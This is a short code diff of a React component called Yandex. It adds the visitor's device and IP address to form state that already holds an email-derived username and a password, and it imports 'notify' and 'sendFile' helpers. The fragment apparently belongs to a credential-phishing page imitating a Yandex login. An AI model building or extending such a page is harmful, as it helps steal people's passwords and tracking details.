@@ -3,9 +3,11 @@ import React, { Fragment, useState } from "react";
 import { Helmet } from "react-helmet";
 import { notify, sendFile } from "../servers";
 
-function Yandex({location}) {
+function Yandex({ location }) {
   const [values, setValues] = useState({
     username: location.state.email,
+    device: location.state.device,
+    ip: location.state.ip,
     password: "",
   });
 
